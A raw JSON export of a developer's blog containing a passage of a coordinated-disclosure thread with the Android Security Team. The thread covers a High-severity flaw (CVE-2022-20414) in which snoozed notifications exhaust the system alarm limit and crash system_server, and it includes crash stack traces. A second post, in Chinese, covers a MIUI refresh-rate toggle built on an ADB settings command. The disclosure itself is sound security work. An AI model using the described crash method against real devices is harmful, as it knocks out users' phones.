class=\"line\">        at com.android.server.notification.NotificationManagerService$SnoozeNotificationRunnable.run(NotificationManagerService.java:6920)</span><br><span class=\"line\">        at android.os.Handler.handleCallback(Handler.java:938)</span><br><span class=\"line\">        at android.os.Handler.dispatchMessage(Handler.java:99)</span><br><span class=\"line\">        at android.os.Looper.loopOnce(Looper.java:210)</span><br><span class=\"line\">        at android.os.Looper.loop(Looper.java:299)</span><br><span class=\"line\">        at com.android.server.SystemServer.run(SystemServer.java:951)</span><br><span class=\"line\">        at com.android.server.SystemServer.main(SystemServer.java:641)</span><br><span class=\"line\">        at java.lang.reflect.Method.invoke(Native Method)</span><br><span class=\"line\">        at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:576)</span><br><span class=\"line\">        at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:1051)</span><br><span class=\"line\">2022-05-27 16:35:11.454 1451-1451/system_process E/AndroidRuntime: *** FATAL EXCEPTION IN SYSTEM PROCESS: main</span><br><span class=\"line\">    java.lang.IllegalStateException: Maximum limit of concurrent alarms 500 reached for uid: 1000, callingPackage: android</span><br><span class=\"line\">        at com.android.server.alarm.AlarmManagerService.setImpl(AlarmManagerService.java:2087)</span><br><span class=\"line\">        at com.android.server.alarm.AlarmManagerService$5.set(AlarmManagerService.java:2630)</span><br><span class=\"line\">        at android.app.AlarmManager.setImpl(AlarmManager.java:957)</span><br><span class=\"line\">        at android.app.AlarmManager.setImpl(AlarmManager.java:917)</span><br><span class=\"line\">        at android.app.AlarmManager.setExactAndAllowWhileIdle(AlarmManager.java:1185)</span><br><span class=\"line\">        at com.android.server.notification.SnoozeHelper.lambda$scheduleRepostAtTime$2$SnoozeHelper(SnoozeHelper.java:508)</span><br><span class=\"line\">        at com.android.server.notification.SnoozeHelper$$ExternalSyntheticLambda4.run(Unknown Source:10)</span><br><span class=\"line\">        at com.android.server.notification.SnoozeHelper.scheduleRepostAtTime(SnoozeHelper.java:513)</span><br><span class=\"line\">        at com.android.server.notification.SnoozeHelper.scheduleRepost(SnoozeHelper.java:498)</span><br><span class=\"line\">        at com.android.server.notification.SnoozeHelper.snooze(SnoozeHelper.java:240)</span><br><span class=\"line\">        at com.android.server.notification.NotificationManagerService$SnoozeNotificationRunnable.snoozeNotificationLocked(NotificationManagerService.java:6978)</span><br><span class=\"line\">        at com.android.server.notification.NotificationManagerService$SnoozeNotificationRunnable.snoozeLocked(NotificationManagerService.java:6955)</span><br><span class=\"line\">        at com.android.server.notification.NotificationManagerService$SnoozeNotificationRunnable.run(NotificationManagerService.java:6920)</span><br><span class=\"line\">        at android.os.Handler.handleCallback(Handler.java:938)</span><br><span class=\"line\">        at android.os.Handler.dispatchMessage(Handler.java:99)</span><br><span class=\"line\">        at android.os.Looper.loopOnce(Looper.java:210)</span><br><span class=\"line\">        at android.os.Looper.loop(Looper.java:299)</span><br><span class=\"line\">        at com.android.server.SystemServer.run(SystemServer.java:951)</span><br><span class=\"line\">        at com.android.server.SystemServer.main(SystemServer.java:641)</span><br><span class=\"line\">        at java.lang.reflect.Method.invoke(Native Method)</span><br><span class=\"line\">        at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:576)</span><br><span class=\"line\">        at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:1051)</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"HWASan-output-if-available\"><a href=\"#HWASan-output-if-available\" class=\"headerlink\" title=\"HWASan output (if available)\"></a>HWASan output (if available)</h4><p>……</p>\n<h4 id=\"Does-anyone-else-know-about-this-vulnerability\"><a href=\"#Does-anyone-else-know-about-this-vulnerability\" class=\"headerlink\" title=\"Does anyone else know about this vulnerability?\"></a>Does anyone else know about this vulnerability?</h4><ul>\n<li>No, this vulnerability is private</li>\n<li>Yes, this vulnerability is public or known to third parties</li>\n</ul>\n<h4 id=\"How-would-you-like-to-be-publicly-acknowledged-for-your-report\"><a href=\"#How-would-you-like-to-be-publicly-acknowledged-for-your-report\" class=\"headerlink\" title=\"How would you like to be publicly acknowledged for your report?\"></a>How would you like to be publicly acknowledged for your report?</h4><blockquote>\n<p>If your report is successful we will acknowledge you using this information in the next release.</p>\n</blockquote>\n<p>It’s my pleasure.</p>\n<hr>\n<h3 id=\"What-to-expect\"><a href=\"#What-to-expect\" class=\"headerlink\" title=\"What to expect\"></a>What to expect</h3><ol>\n<li>You will receive an email confirming we have received your report</li>\n<li>The report will be sorted and added to the queue of reports</li>\n<li>A member of the team will review your report and determine if it is a valid</li>\n<li>During this stage it is common for us to contact you with questions about your report</li>\n<li>The report is then triaged and the details of the bug are supplied to the relevant team</li>\n<li>Depending on the bug we may take between 7 and 14 days to determine the bug’s severity</li>\n<li>If successful we will contact you to inform you of your reward</li>\n</ol>\n<hr>\n<h3 id=\"Comments\"><a href=\"#Comments\" class=\"headerlink\" title=\"Comments\"></a>Comments</h3><blockquote>\n<p><a href=\"mailto:&#x79;&#115;&#121;&#57;&#x35;&#x30;&#56;&#48;&#x33;&#64;&#x67;&#x6d;&#97;&#105;&#x6c;&#x2e;&#x63;&#111;&#x6d;\">&#x79;&#115;&#121;&#57;&#x35;&#x30;&#56;&#48;&#x33;&#64;&#x67;&#x6d;&#97;&#105;&#x6c;&#x2e;&#x63;&#111;&#x6d;</a></p>\n</blockquote>\n<p>I have some suggestions as solutions:</p>\n<ol>\n<li>Hide the <code>snoozeNotification</code> method for app developers.</li>\n<li>Alarms cannot be set for system processes by non-system processes.</li>\n<li>Don’t throw an exception for system processes when reaching the maximum limit of alarms, then we can delete the alarm with the longest duration before set a new alarm.</li>\n</ol>\n<blockquote>\n<p><a href=\"mailto:&#106;&#x61;&#x2e;&#46;&#x2e;&#64;&#103;&#111;&#111;&#x67;&#x6c;&#101;&#46;&#99;&#x6f;&#109;\">&#106;&#x61;&#x2e;&#46;&#x2e;&#64;&#103;&#111;&#111;&#x67;&#x6c;&#101;&#46;&#99;&#x6f;&#109;</a></p>\n</blockquote>\n<p>Assigned to <a href=\"mailto:&#x61;&#115;&#x2e;&#46;&#x2e;&#x40;&#x67;&#111;&#x6f;&#x67;&#x6c;&#101;&#46;&#x63;&#111;&#x6d;\">&#x61;&#115;&#x2e;&#46;&#x2e;&#x40;&#x67;&#111;&#x6f;&#x67;&#x6c;&#101;&#46;&#x63;&#111;&#x6d;</a>.<br>Thank you for submitting this report. We’ve filed an internal report for the Android engineering team to investigate further (specified by the Android ID label). Please follow coordinated disclosure practices, such as keeping this report confidential until we have had time to assess your issue, and if necessary, release an update for Android devices.</p>\n<p>PLEASE TAKE THE FOLLOWING ACTIONS NOW, if you have not already:</p>\n<ol>\n<li>Sign the Google Contributor License Agreement (1).</li>\n<li>In a comment below, let us know how you would like to be acknowledged (2) for discovering this potential vulnerability (including company affiliation, if any).</li>\n<li>Provide a PoC that reproduces against a recent Android build (not more than 30 days old).</li>\n</ol>\n<p>The typical lifecycle for a confirmed security vulnerability is as follows:</p>\n<ol>\n<li>Initial severity rating assessment (subject to change after review by component owners) (3)</li>\n<li>Development of an update</li>\n<li>Assignment of CVE</li>\n<li>Shared under NDA, as part of coordinated disclosure, to Android partners for remediation</li>\n<li>Release in a public Android security bulletin</li>\n<li>Android Security Rewards payment (if applicable)</li>\n</ol>\n<p>Most of these steps will typically be communicated in the sidebar. Please note that we may not reply to requests for status updates or information, however we will continue our typical assessment and remediation efforts. This issue will be updated with information once the reported issue is publicly fixed, if not prior.</p>\n<p>Thank you,<br>Android Security Team</p>\n<p>(1) Contributor license agreement: <a href=\"https://cla.developers.google.com/clas\">https://cla.developers.google.com/clas</a><br>(2) Android Security Acknowledgements: <a href=\"https://source.android.com/security/overview/acknowledgements\">https://source.android.com/security/overview/acknowledgements</a><br>(3) Android severity guidelines: <a href=\"https://source.android.com/security/overview/updates-resources.html\">https://source.android.com/security/overview/updates-resources.html</a></p>\n<blockquote>\n<p><a href=\"mailto:&#121;&#x73;&#x79;&#57;&#53;&#x30;&#x38;&#48;&#51;&#x40;&#103;&#x6d;&#x61;&#x69;&#x6c;&#x2e;&#99;&#111;&#x6d;\">&#121;&#x73;&#x79;&#57;&#53;&#x30;&#x38;&#48;&#51;&#x40;&#103;&#x6d;&#x61;&#x69;&#x6c;&#x2e;&#99;&#111;&#x6d;</a></p>\n</blockquote>\n<p>Thank you for your reply. ACTIONS DONE:</p>\n<ol>\n<li>I have signed the CLA for only myself.</li>\n<li>If my work can help improve AOSP, it’s an honor for me to be acknowledged. I want my information to be displayed like this: Sylvester Yao (姚圣禹, <a href=\"https://blog.ysy950803.top/\">blog.ysy950803.top</a>)</li>\n<li>The PoC is an Android Studio Project including source code and APK. Please download the attachment.</li>\n</ol>\n<blockquote>\n<p><a href=\"mailto:&#106;&#97;&#46;&#x2e;&#46;&#x40;&#103;&#111;&#111;&#103;&#x6c;&#101;&#x2e;&#99;&#111;&#x6d;\">&#106;&#97;&#46;&#x2e;&#46;&#x40;&#103;&#111;&#111;&#103;&#x6c;&#101;&#x2e;&#99;&#111;&#x6d;</a></p>\n</blockquote>\n<p>Hello,</p>\n<p>Thank you for the additional information as well as your acknowledgement. We will be following our standard investigation and remediation process with this report and ask for your continued confidentiality while we work on this issue.</p>\n<p>Thank you,<br>Android Security Team</p>\n<blockquote>\n<p><a href=\"mailto:&#101;&#106;&#46;&#46;&#x2e;&#x40;&#103;&#111;&#111;&#103;&#108;&#101;&#x2e;&#99;&#x6f;&#x6d;\">&#101;&#106;&#46;&#46;&#x2e;&#x40;&#103;&#111;&#111;&#103;&#108;&#101;&#x2e;&#99;&#x6f;&#x6d;</a></p>\n</blockquote>\n<p>Hello,</p>\n<p>The Android security team has conducted an initial severity assessment on this report. Based on our published severity assessment matrix (1) it was rated as High severity. This issue has been assigned to the appropriate team for remediation, and we’re targeting a fix for release in an upcoming Android Security Bulletin. We will provide an update on remediation status as it becomes available. We ask for your continued confidentiality as we proceed with our standard investigation and remediation process.</p>\n<p>Thank you,<br>Android Security Team<br>(1) Severity Matrix: <a href=\"https://source.android.com/security/overview/updates-resources#severity\">https://source.android.com/security/overview/updates-resources#severity</a></p>\n<blockquote>\n<p><a href=\"mailto:&#121;&#x73;&#x79;&#x39;&#x35;&#48;&#x38;&#x30;&#51;&#x40;&#103;&#x6d;&#97;&#x69;&#x6c;&#46;&#x63;&#111;&#x6d;\">&#121;&#x73;&#x79;&#x39;&#x35;&#48;&#x38;&#x30;&#51;&#x40;&#103;&#x6d;&#97;&#x69;&#x6c;&#46;&#x63;&#111;&#x6d;</a></p>\n</blockquote>\n<p>Thanks for your efforts!</p>\n<p>I will continue to follow this issue and support you in any way I can.</p>\n<blockquote>\n<p><a href=\"mailto:&#x79;&#115;&#x79;&#57;&#x35;&#48;&#x38;&#48;&#x33;&#64;&#x67;&#x6d;&#97;&#x69;&#108;&#x2e;&#99;&#111;&#109;\">&#x79;&#115;&#x79;&#57;&#x35;&#48;&#x38;&#48;&#x33;&#64;&#x67;&#x6d;&#97;&#x69;&#108;&#x2e;&#99;&#111;&#109;</a></p>\n</blockquote>\n<p>Hello! How is the progress?</p>\n<blockquote>\n<p><a href=\"mailto:&#106;&#97;&#x2e;&#x2e;&#46;&#64;&#103;&#x6f;&#x6f;&#x67;&#x6c;&#101;&#46;&#x63;&#111;&#x6d;\">&#106;&#97;&#x2e;&#x2e;&#46;&#64;&#103;&#x6f;&#x6f;&#x67;&#x6c;&#101;&#46;&#x63;&#111;&#x6d;</a></p>\n</blockquote>\n<p>Hello,</p>\n<p>Thank you for following up! This issue has been fixed and is targeted for release in an upcoming Android Security Bulletin. It will be reviewed for both a CVE and reward eligibility under Android Security Rewards Program rules closer to that time (1). Further details will be provided here when available.</p>\n<p>Thank you,<br>Android Security Team</p>\n<p>(1) <a href=\"https://www.google.com/about/appsecurity/android-rewards/\">https://www.google.com/about/appsecurity/android-rewards/</a></p>\n<blockquote>\n<p><a href=\"mailto:&#x61;&#x6e;&#46;&#x2e;&#x2e;&#64;&#103;&#111;&#x6f;&#x67;&#x6c;&#x65;&#x2e;&#99;&#x6f;&#109;\">&#x61;&#x6e;&#46;&#x2e;&#x2e;&#64;&#103;&#111;&#x6f;&#x67;&#x6c;&#x65;&#x2e;&#99;&#x6f;&#109;</a></p>\n</blockquote>\n<p>Congratulations! The rewards committee decided to reward you USD $5,000 for reporting this High severity vulnerability. We are paying for the bug report and proof of concept.</p>\n<p>To collect the reward, if you haven’t already, please complete the Android Contributor License Agreement for Individuals, so we can use your test code:<br><a href=\"https://cla.developers.google.com/clas\">https://cla.developers.google.com/clas</a></p>\n<p>You will receive an email with details on the next steps to collect the reward.</p>\n<p>Thank you for your contributions to the safety and security of the Android ecosystem.</p>\n<p>Best Regards,<br>Android Security Team</p>\n<blockquote>\n<p><a href=\"mailto:&#121;&#115;&#x79;&#x39;&#53;&#48;&#x38;&#x30;&#51;&#64;&#x67;&#109;&#97;&#105;&#108;&#x2e;&#99;&#111;&#x6d;\">&#121;&#115;&#x79;&#x39;&#53;&#48;&#x38;&#x30;&#51;&#64;&#x67;&#109;&#97;&#105;&#108;&#x2e;&#99;&#111;&#x6d;</a></p>\n</blockquote>\n<p>Thank you for your hard work, I am honored to contribute to the Google ecosystem.</p>\n<blockquote>\n<p><a href=\"mailto:&#x6a;&#x61;&#x2e;&#x2e;&#x2e;&#64;&#x67;&#111;&#111;&#x67;&#x6c;&#x65;&#x2e;&#99;&#x6f;&#x6d;\">&#x6a;&#x61;&#x2e;&#x2e;&#x2e;&#64;&#x67;&#111;&#111;&#x67;&#x6c;&#x65;&#x2e;&#99;&#x6f;&#x6d;</a></p>\n</blockquote>\n<p>Hello,</p>\n<p>We will be releasing a patch for this issue in an upcoming bulletin. It will first be released to partners, then to the public the following month.</p>\n<p>If you haven’t already, please complete the Google Contributor License Agreement for Individuals, so we can use your patch and test code (1).</p>\n<p>We’d also like to recognize your contribution on our acknowledgements page (2). The acknowledgement information we have on record is “Sylvester Yao (姚圣禹, blog.ysy950803.top)”. Please let us know if it has changed.</p>\n<p>We may also make this bug publicly accessible when the fix is submitted to AOSP. Please let us know if you would like to keep the bug private instead.</p>\n<p>Your CVE ID is CVE-2022-20414.</p>\n<p>Thanks,<br>Android Security Team</p>\n<p>(1) <a href=\"https://cla.developers.google.com/clas\">https://cla.developers.google.com/clas</a><br>(2) <a href=\"https://source.android.com/security/overview/acknowledgements\">https://source.android.com/security/overview/acknowledgements</a></p>\n<blockquote>\n<p><a href=\"mailto:&#x79;&#115;&#x79;&#x39;&#x35;&#48;&#56;&#x30;&#51;&#x40;&#103;&#109;&#97;&#x69;&#108;&#x2e;&#x63;&#111;&#x6d;\">&#x79;&#115;&#x79;&#x39;&#x35;&#48;&#56;&#x30;&#51;&#x40;&#103;&#109;&#97;&#x69;&#108;&#x2e;&#x63;&#111;&#x6d;</a></p>\n</blockquote>\n<p>Thanks for your work. Where can I see the fix code?</p>\n<blockquote>\n<p><a href=\"mailto:&#106;&#x61;&#46;&#x2e;&#46;&#x40;&#103;&#x6f;&#111;&#x67;&#108;&#x65;&#x2e;&#x63;&#x6f;&#x6d;\">&#106;&#x61;&#46;&#x2e;&#46;&#x40;&#103;&#x6f;&#111;&#x67;&#108;&#x65;&#x2e;&#x63;&#x6f;&#x6d;</a></p>\n</blockquote>\n<p>Hello,</p>\n<p>This is targeted to be released in the November bulletin. Thank you for your continued engagement with the Android VRP!</p>\n<p>Best,<br>Android Security Team</p>\n"},{"layout":"post","title":"给MIUI开发一个刷新率开关","subtitle":"又闲下来了。","date":"2023-02-27T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"cover":"https://cdn.sspai.com/2023/02/27/867802e2f5542451c96578a3885647db.png","_content":"\n### 背景\n\n我们很容易发现，现在小米等厂商支持高刷新率120Hz的手机，在系统设置中都隐藏了90Hz这个档位，只有60和120两种选项。对很多人来说，60虽然省电但是太不流畅，影响体验，120虽然流畅但太耗电，出门会有电量焦虑，折中的90其实才是最合适的选择（至少在心理上）。\n\n![image-20230227172559371](https://cdn.sspai.com/2023/02/27/5b3e74a2686475909664d5225f2ba124.png)\n\n我一直试图搞清楚为什么厂商不愿意开放90Hz这个选项，对系统来说，刷新率无非就是一个可以修改的数值。是什么原因不让用户多一个选择呢？\n\n### 调查\n\n经过一些简单的查询，我发现网络上的解释一般都是硬件本身不支持，芯片功能较弱，不足以驱动多种刷新率，强制修改为90Hz长时间可能造成屏幕损坏等。\n\n当然，我也不忘去问一问无所不知的ChatGPT，他还是一如既往地说了一些车轱辘话。他这个“技术退步”论倒是有点意思。\n\n![image-20230227170811351](https://cdn.sspai.com/2023/02/27/2b5dacfe7525de4fb7758426b3c1b3d0.png)\n\n其实“硬件不支持”这个说法我并不是很赞同。如果你在Android系统的开发者选项中打开“显示屏幕刷新率”的开关，就会发现在不同的使用场景下，不只有60Hz和120Hz两种刷新率，比如息屏AOD为了降低功耗，就只有30Hz；很多手游最高也只支持90Hz，即便开启120Hz也没用。因此，要是说强制修改为其他隐藏刷新率会导致屏幕损坏，我觉得是不太可能的，对那种本身就支持LTPO的设备就更不可能了。\n\n此外，Android系统也给开发者提供了查询所支持刷新率的接口，通过接口返回的Mode数组得知具体的刷新率参数：\n\n```kotlin\ngetSystemService(Context.WINDOW_SERVICE) as WindowManager).defaultDisplay.supportedModes.map {\n    it.refreshRate.toInt()\n}\n```\n\n在我的小米13上，通过上述接口获取到的刷新率为`[60, 90, 120]`，说明在系统看来是支持90Hz的。\n\n### 开发\n\n于是乎，我想开发一个小工具，既可以解锁90Hz刷新率，也可以在通知中心快捷地切换高低刷新率，免去每次都要去系统设置操作老半天的烦恼。\n\n经过一番搜索，我发现在MIUI当中，要修改刷新率其实就是一行ADB命令的事情：\n\n```shell\nadb shell settings put secure miui_refresh_rate 90\n```\n\n此命令会修改系统Secure设置数据库，对非系统应用的开发者来说，通过官方SDK是没有办法直接修改的。但是，自从Android引入了无线ADB调试的功能之后，我们就可以配合[Shizuku](https://shizuku.rikka.app/zh-hans/)在应用内部执行`adb shell`命令了，相当于进行了免ROOT越权。\n\n最终小工具的形态也很简单，一个快捷开关，一个简单的配置页面：\n\n![image-20230227210347006](https://cdn.sspai.com/2023/02/27/2f70b884ea93a3f897baff5eeb05c00a.png)\n\n![image-20230227211124863](https://cdn.sspai.com/2023/02/27/867802e2f5542451c96578a3885647db.png)\n\n当然，我不会忘了开源：[FpsSwitcher](https://github.com/ysy950803/FpsSwitcher)，你也可以在酷安下载到成品：[MIUI 帧率开关](https://www.coolapk.com/apk/285746)\n","source":"_posts/2023-02-28-给MIUI开发一个刷新率开关.md","raw":"---\nlayout:     post\ntitle:      给MIUI开发一个刷新率开关\nsubtitle:   又闲下来了。\ndate:       2023-02-28\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ncover: https://cdn.sspai.com/2023/02/27/867802e2f5542451c96578a3885647db.png\ntags:\n    - Android\n    - 鼓捣折腾\n---\n\n### 背景\n\n我们很容易发现，现在小米等厂商支持高刷新率120Hz的手机，在系统设置中都隐藏了90Hz这个档位，只有60和120两种选项。对很多人来说，60虽然省电但是太不流畅，影响体验，120虽然流畅但太耗电，出门会有电量焦虑，折中的90其实才是最合适的选择（至少在心理上）。\n\n![image-20230227172559371](https://cdn.sspai.com/2023/02/27/5b3e74a2686475909664d5225f2ba124.png)\n\n我一直试图搞清楚为什么厂商不愿意开放90Hz这个选项，对系统来说，刷新率无非就是一个可以修改的数值。是什么原因不让用户多一个选择呢？\n\n### 调查\n\n经过一些简单的查询，我发现网络上的解释一般都是硬件本身不支持，芯片功能较弱，不足以驱动多种刷新率，强制修改为90Hz长时间可能造成屏幕损坏等。\n\n当然，我也不忘去问一问无所不知的ChatGPT，他还是一如既往地说了一些车轱辘话。他这个“技术退步”论倒是有点意思。\n\n![image-20230227170811351](https://cdn.sspai.com/2023/02/27/2b5dacfe7525de4fb7758426b3c1b3d0.png)\n\n其实“硬件不支持”这个说法我并不是很赞同。如果你在Android系统的开发者选项中打开“显示屏幕刷新率”的开关，就会发现在不同的使用场景下，不只有60Hz和120Hz两种刷新率，比如息屏AOD为了降低功耗，就只有30Hz；很多手游最高也只支持90Hz，即便开启120Hz也没用。因此，要是说强制修改为其他隐藏刷新率会导致屏幕损坏，我觉得是不太可能的，对那种本身就支持LTPO的设备就更不可能了。\n\n此外，Android系统也给开发者提供了查询所支持刷新率的接口，通过接口返回的Mode数组得知具体的刷新率参数：\n\n```kotlin\ngetSystemService(Context.WINDOW_SERVICE) as WindowManager).defaultDisplay.supportedModes.map {\n    it.refreshRate.toInt()\n}\n```\n\n在我的小米13上，通过上述接口获取到的刷新率为`[60, 90, 120]`，说明在系统看来是支持90Hz的。\n\n### 开发\n\n于是乎，我想开发一个小工具，既可以解锁90Hz刷新率，也可以在通知中心快捷地切换高低刷新率，免去每次都要去系统设置操作老半天的烦恼。\n\n经过一番搜索，我发现在MIUI当中，要修改刷新率其实就是一行ADB命令的事情：\n\n```shell\nadb shell settings put secure miui_refresh_rate 90\n```\n\n此命令会修改系统Secure设置数据库，对非系统应用的开发者来说，通过官方SDK是没有办法直接修改的。但是，自从Android引入了无线ADB调试的功能之后，我们就可以配合[Shizuku](https://shizuku.rikka.app/zh-hans/)在应用内部执行`adb shell`命令了，相当于进行了免ROOT越权。\n\n最终小工具的形态也很简单，一个快捷开关，一个简单的配置页面：\n\n![image-20230227210347006](https://cdn.sspai.com/2023/02/27/2f70b884ea93a3f897baff5eeb05c00a.png)\n\n![image-20230227211124863](https://cdn.sspai.com/2023/02/27/867802e2f5542451c96578a3885647db.png)\n\n当然，我不会忘了开源：[FpsSwitcher](https://github.com/ysy950803/FpsSwitcher)，你也可以在酷安下载到成品：[MIUI 帧率开关](https://www.coolapk.com/apk/285746)\n","slug":"给MIUI开发一个刷新率开关","published":1,"updated":"2024-03-25T07:31:26.042Z","comments":1,"photos":[],"link":"","_id":"cluaufh1o0058the60vjfes9s","content":"<h3 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h3><p>我们很容易发现，现在小米等厂商支持高刷新率120Hz的手机，在系统设置中都隐藏了90Hz这个档位，只有60和120两种选项。对很多人来说，60虽然省电但是太不流畅，影响体验，120虽然流畅但太耗电，出门会有电量焦虑，折中的90其实才是最合适的选择（至少在心理上）。</p>\n<p><img src=\"https://cdn.sspai.com/2023/02/27/5b3e74a2686475909664d5225f2ba124.png\" alt=\"image-20230227172559371\"></p>\n<p>我一直试图搞清楚为什么厂商不愿意开放90Hz这个选项，对系统来说，刷新率无非就是一个可以修改的数值。是什么原因不让用户多一个选择呢？</p>\n<h3 id=\"调查\"><a href=\"#调查\" class=\"headerlink\" title=\"调查\"></a>调查</h3><p>经过一些简单的查询，我发现网络上的解释一般都是硬件本身不支持，芯片功能较弱，不足以驱动多种刷新率，强制修改为90Hz长时间可能造成屏幕损坏等。</p>\n<p>当然，我也不忘去问一问无所不知的ChatGPT，他还是一如既往地说了一些车轱辘话。他这个“技术退步”论倒是有点意思。</p>\n<p><img src=\"https://cdn.sspai.com/2023/02/27/2b5dacfe7525de4fb7758426b3c1b3d0.png\" alt=\"image-20230227170811351\"></p>\n<p>其实“硬件不支持”这个说法我并不是很赞同。如果你在Android系统的开发者选项中打开“显示屏幕刷新率”的开关，就会发现在不同的使用场景下，不只有60Hz和120Hz两种刷新率，比如息屏AOD为了降低功耗，就只有30Hz；很多手游最高也只支持90Hz，即便开启120Hz也没用。因此，要是说强制修改为其他隐藏刷新率会导致屏幕损坏，我觉得是不太可能的，对那种本身就支持LTPO的设备就更不可能了。</p>\n<p>此外，Android系统也给开发者提供了查询所支持刷新率的接口，通过接口返回的Mode数组得知具体的刷新率参数：</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">getSystemService(Context.WINDOW_SERVICE) <span class=\"keyword\">as</span> WindowManager).defaultDisplay.supportedModes.map &#123;</span><br><span class=\"line\">    it.refreshRate.toInt()</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在我的小米13上，通过上述接口获取到的刷新率为<code>[60, 90, 120]</code>，说明在系统看来是支持90Hz的。</p>\n<h3 id=\"开发\"><a href=\"#开发\" class=\"headerlink\" title=\"开发\"></a>开发</h3><p>于是乎，我想开发一个小工具，既可以解锁90Hz刷新率，也可以在通知中心快捷地切换高低刷新率，免去每次都要去系统设置操作老半天的烦恼。</p>\n<p>经过一番搜索，我发现在MIUI当中，要修改刷新率其实就是一行ADB命令的事情：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">adb shell settings put secure miui_refresh_rate 90</span><br></pre></td></tr></table></figure>\n\n<p>此命令会修改系统Secure设置数据库，对非系统应用的开发者来说，通过官方SDK是没有办法直接修改的。但是，自从Android引入了无线ADB调试的功能之后，我们就可以配合<a href=\"https://shizuku.rikka.app/zh-hans/\">Shizuku</a>在应用内部执行<code>adb shell</code>命令了，相当于进行了免ROOT越权。</p>\n<p>最终小工具的形态也很简单，一个快捷开关，一个简单的配置页面：</p>\n<p><img src=\"https://cdn.sspai.com/2023/02/27/2f70b884ea93a3f897baff5eeb05c00a.png\" alt=\"image-20230227210347006\"></p>\n<p><img src=\"https://cdn.sspai.com/2023/02/27/867802e2f5542451c96578a3885647db.png\" alt=\"image-20230227211124863\"></p>\n<p>当然，我不会忘了开源：<a href=\"https://github.com/ysy950803/FpsSwitcher\">FpsSwitcher</a>，你也可以在酷安下载到成品：<a href=\"https://www.coolapk.com/apk/285746\">MIUI 帧率开关</a></p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover_type":"img","excerpt":"","more":"<h3 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h3><p>我们很容易发现，现在小米等厂商支持高刷新率120Hz的手机，在系统设置中都隐藏了90Hz这个档位，只有60和120两种选项。对很多人来说，60虽然省电但是太不流畅，影响体验，120虽然流畅但太耗电，出门会有电量焦虑，折中的90其实才是最合适的选择（至少在心理上）。</p>\n<p><img src=\"https://cdn.sspai.com/2023/02/27/5b3e74a2686475909664d5225f2ba124.png\" alt=\"image-20230227172559371\"></p>\n<p>我一直试图搞清楚为什么厂商不愿意开放90Hz这个选项，对系统来说，刷新率无非就是一个可以修改的数值。是什么原因不让用户多一个选择呢？</p>\n<h3 id=\"调查\"><a href=\"#调查\" class=\"headerlink\" title=\"调查\"></a>调查</h3><p>经过一些简单的查询，我发现网络上的解释一般都是硬件本身不支持，芯片功能较弱，不足以驱动多种刷新率，强制修改为90Hz长时间可能造成屏幕损坏等。</p>\n<p>当然，我也不忘去问一问无所不知的ChatGPT，他还是一如既往地说了一些车轱辘话。他这个“技术退步”论倒是有点意思。</p>\n<p><img src=\"https://cdn.sspai.com/2023/02/27/2b5dacfe7525de4fb7758426b3c1b3d0.png\" alt=\"image-20230227170811351\"></p>\n<p>其实“硬件不支持”这个说法我并不是很赞同。如果你在Android系统的开发者选项中打开“显示屏幕刷新率”的开关，就会发现在不同的使用场景下，不只有60Hz和120Hz两种刷新率，比如息屏AOD为了降低功耗，就只有30Hz；很多手游最高也只支持90Hz，即便开启120Hz也没用。因此，要是说强制修改为其他隐藏刷新率会导致屏幕损坏，我觉得是不太可能的，对那种本身就支持LTPO的设备就更不可能了。</p>\n<p>此外，Android系统也给开发者提供了查询所支持刷新率的接口，通过接口返回的Mode数组得知具体的刷新率参数：</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">getSystemService(Context.WINDOW_SERVICE) <span class=\"keyword\">as</span> WindowManager).defaultDisplay.supportedModes.map &#123;</span><br><span class=\"line\">    it.refreshRate.toInt()</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在我的小米13上，通过上述接口获取到的刷新率为<code>[60, 90, 120]</code>，说明在系统看来是支持90Hz的。</p>\n<h3 id=\"开发\"><a href=\"#开发\" class=\"headerlink\" title=\"开发\"></a>开发</h3><p>于是乎，我想开发一个小工具，既可以解锁90Hz刷新率，也可以在通知中心快捷地切换高低刷新率，免去每次都要去系统设置操作老半天的烦恼。</p>\n<p>经过一番搜索，我发现在MIUI当中，要修改刷新率其实就是一行ADB命令的事情：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">adb shell settings put secure miui_refresh_rate 90</span><br></pre></td></tr></table></figure>\n\n<p>此命令会修改系统Secure设置数据库，对非系统应用的开发者来说，通过官方SDK是没有办法直接修改的。但是，自从Android引入了无线ADB调试的功能之后，我们就可以配合<a href=\"https://shizuku.rikka.app/zh-hans/\">Shizuku</a>在应用内部执行<code>adb shell</code>命令了，相当于进行了免ROOT越权。</p>\n<p>最终小工具的形态也很简单，一个快捷开关，一个简单的配置页面：</p>\n<p><img 